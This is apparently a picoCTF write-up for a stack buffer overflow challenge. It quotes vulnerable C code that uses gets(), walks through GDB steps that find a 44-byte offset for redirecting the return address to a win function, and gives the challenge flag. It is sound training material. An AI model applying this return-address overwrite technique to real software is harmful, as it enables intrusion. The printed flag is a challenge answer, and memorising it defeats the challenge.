# buffer overflow 1

- [Description](#description)
- [Approach](#approach)
- [Flag](#flag)

## Description

Control the return address <br>
Additional details will be available after launching your challenge instance.

Now we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/186/vuln).
You can view source [here](https://artifacts.picoctf.net/c/186/vuln.c). And connect with it using `nc saturn.picoctf.net 58646`

## Approach

Based on the `vuln()` function provided in the C code, it seems that we need to overflow the buffer such that it returns to the `win()` address instead of `main()` after the program runs by using the `gets(buf)` function.

```c
void vuln(){
  char buf[BUFSIZE];
  gets(buf);

  printf("Okay, time to return... Fingers Crossed... Jumping to 0x%x\n", get_return_address());
}
```

Using `checksec`, it appears that the binary does not have PIE enabled so the base addresses are fixed.

To overflow then return address to `main()`, I first need to find the offset to that address location, before overwriting the address using GDB.

```
gef➤  pattern create 50
[+] Generating a pattern of 50 bytes (n=4)
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama
```

After running the program to run and providing the input string, we can see that the program receives a segmentation fault and failed to return to `main()` as in tries to return to `0x6161616c`.

<p align="center">
  <img src="https://raw.githubusercontent.com/DarrenPea/picoCTF_writeups/refs/heads/main/picoCTF-2022/Binary-Exploitation/buffer-overflow-1/img/find_offset.png" />
</p>

To look for the offset, I can use pattern search.

```
gef➤  pattern search 0x6161616c
[+] Searching for '6c616161'/'6161616c' with period=4
[+] Found at offset 44 (little-endian search) likely
```

With this offset of 44, I now proceeded to write `script.py` to obtain the flag.

## Flag

`picoCTF{addr3ss3s_ar3_3asy_5c6baa9e}`